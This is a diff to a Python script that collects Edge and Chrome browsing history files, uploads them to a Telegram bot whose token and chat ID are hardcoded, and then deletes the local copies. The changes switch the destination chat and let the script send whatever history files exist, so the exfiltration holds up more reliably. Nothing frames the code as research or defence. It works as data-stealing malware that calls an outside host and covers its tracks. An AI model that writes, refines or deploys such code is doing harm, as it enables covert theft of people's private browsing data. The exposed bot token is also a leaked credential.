@@ -91,21 +91,24 @@ def fetch_history():
 if __name__ == "__main__":
     fetch_history()
     TOKEN = '8683412588:AAGgmtFQqw7En-nIe0pgNGFUGvfBBup_3UI'
-    CHAT_ID = '936154719'
+    CHAT_ID = '-5455393172'
     url = f"https://api.telegram.org/bot{TOKEN}/sendMediaGroup"
-    file_paths = ["edge_history_output.txt", "chrome_history_output.txt"]
+
+# Check all potential output paths
+    possible_paths = ["edge_history_output.txt", "chrome_history_output.txt"]
+    
+    # Only include files that actually exist
+    file_paths = [path for path in possible_paths if os.path.exists(path)]
+
+    # If no history files were generated at all, stop here
+    if not file_paths:
+        print("Error: No browser history files were found to send.")
+        sys.exit()
 
     files = {}
     media = []
 
-    # Double-check that files exist before trying to send
-    for path in file_paths:
-        if not os.path.exists(path):
-            # time.sleep(2)
-            # print(f"Error: The file '{path}' was not found. Please check the path.")
-            exit()
-
-    # Open the files and map them correctly
+    # Open the existing files and map them correctly
     for i, path in enumerate(file_paths):
         file_key = f"doc_{i}"  # Dynamic key for Telegram
         
@@ -128,7 +131,7 @@ if __name__ == "__main__":
         response = requests.post(url, data=payload, files=files)
         
         if response.status_code == 200:
-            print("All files sent successfully!")
+            print("Available files sent successfully!")
         else:
             print(f"Telegram Error: {response.text}")
 
@@ -137,8 +140,8 @@ if __name__ == "__main__":
         for f in files.values():
             f.close()
 
-
-    if os.path.exists("edge_history_output.txt") and os.path.exists("chrome_history_output.txt"):
-            os.remove("edge_history_output.txt")
-            os.remove("chrome_history_output.txt")
+    # Clean up whatever files were actually created
+    for path in file_paths:
+        if os.path.exists(path):
+            os.remove(path)
 
